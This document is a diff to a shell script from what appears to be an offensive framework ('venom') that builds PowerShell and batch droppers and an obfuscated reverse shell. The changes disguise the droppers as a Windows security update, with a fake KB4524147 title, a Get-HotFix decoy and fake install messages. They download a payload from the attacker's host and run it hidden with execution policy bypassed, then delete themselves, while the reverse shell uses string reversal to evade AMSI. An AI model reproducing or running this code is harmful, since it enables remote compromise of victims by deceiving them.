@@ -12034,10 +12034,20 @@ cat << !
 echo "---"
 
 
-## BUILD DROPPER
-# New update to dropper: add PS terminal title and msg ..
+## BUILD DROPPER (with Get-HotFix decoy command)
+# echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
-echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update ID00788\";Write-Host \"Please Wait, Installing Security Updates ..\" -ForeGroundColor green -BackGroundColor black;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
+echo "<#" > $IPATH/output/$Drop.ps1
+echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
+echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
+echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
+echo "#>" >> $IPATH/output/$Drop.ps1
+echo "" >> $IPATH/output/$Drop.ps1
+echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
+echo "   Get-HotFix;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
+echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
+echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
+echo "iex \$proxy.responseText" >> $IPATH/output/$Drop.ps1
 
 
 ## Build Reverse Powershell Shell
@@ -12048,7 +12058,7 @@ echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @ZHacker13" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "write-Host \"Please Wait, Executing PS Application ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
+echo "write-Host \"Please Wait, Installing KB4524147 Security Updates ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
 echo "\$MethodInvocation = \"gnidocnEiicsA.txeT.metsyS\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
 echo "\$NewObjectCommand = (\$Constructor -Join '');\$icmpv6 = \"StreamWriter\";\$assembly = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
 echo "\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
@@ -12193,6 +12203,7 @@ echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 
 echo "@echo off" > $IPATH/output/$Drop.bat
 echo "title Cumulative Security Update ID00788" >> $IPATH/output/$Drop.bat
 echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
+echo "powershell Get-HotFix" >> $IPATH/output/$Drop.bat
 echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
 echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
 echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution.
@@ -12372,7 +12383,7 @@ persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you
 
 if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
-   echo "title Cumulative Security Update ID00788" >> $IPATH/output/$Drop.$ext.bat
+   echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.$ext.bat
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
